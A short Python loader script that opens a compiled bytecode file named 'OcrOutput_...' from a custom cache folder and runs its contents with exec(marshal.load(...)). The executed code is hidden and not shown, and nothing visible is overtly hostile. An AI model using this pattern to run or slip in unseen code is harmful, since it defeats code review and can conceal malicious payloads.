
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'OcrOutput_68a7ddccc6b74842a0be74d62a8ac933.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
